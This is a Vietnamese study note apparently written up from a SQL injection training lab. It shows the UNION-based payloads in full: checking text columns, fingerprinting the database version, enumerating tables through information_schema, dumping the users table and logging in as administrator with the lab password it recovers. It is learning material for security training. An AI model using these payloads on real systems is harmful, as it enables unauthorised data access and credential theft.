![[lab-sqli-union-version-users.png]]
Lab UNION đọc version DB rồi dump bảng users lấy password administrator.

> [!NOTE] phân tích đề
> - đã biết 2 cột, cả 2 đều text.
> - mục tiêu: version + users.
> -sau khi UNION được rồi, mình thấy mỗi loại DB có hàm version khác nhau, nên mình thử từng hàm Oracle/MySQL/Postgres để biết đang đánh DB nào rồi mới đọc bảng users.
> - liên quan [[các bước thu thập thông tin về csdl]] và [[SQL cheet sheet]].

### hướng giải
- [ ] verify 2 cột text bằng `' UNION SELECT 'a','b'--`.
- [ ] đọc version theo DB.
- [ ] list bảng users nếu cần.
- [ ] dump username, password.
- [ ] login administrator.

### giải
request check cột text:
```
GET /filter?category=Gifts' UNION SELECT 'abc','def'-- HTTP/1.1
```
-> cả `abc`, `def` hiện lên trang.
=> 2 cột đều xài được.

request đọc version (tùy lab):
```sql
' UNION SELECT @@version, NULL--         -- MySQL / MSSQL
' UNION SELECT version(), NULL--         -- Postgres
' UNION SELECT banner, NULL FROM v$version--  -- Oracle
```
ví dụ response Postgres:
```
PostgreSQL 12.3 on x86_64-pc-linux-gnu ...
```
-> biết DB là Postgres.
=> chọn syntax tiếp theo cho đúng.

request đọc users:
```
GET /filter?category=Gifts' UNION SELECT username, password FROM users-- HTTP/1.1
```
response:
```
administrator ... k7m9p2x4q8w1z6t5b3v
carlos ... abc123
```
-> mình lụm được password administrator là `k7m9p2x4q8w1z6t5b3v` (mỗi instance random 20 ký tự a-z0-9).
=> lab khác có thể thêm prefix bảng kiểu `users_abc`, thì list trước:
```
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abc'--
```

login:
```
POST /login
username=administrator&password=k7m9p2x4q8w1z6t5b3v
```
-> vào được admin.
=> solved.

> [!NOTE] bài học
> - version quyết định syntax sau đó.
> - users luôn có administrator.
> - sau bài này qua [[Lab-Blind boolean conditional responses]].
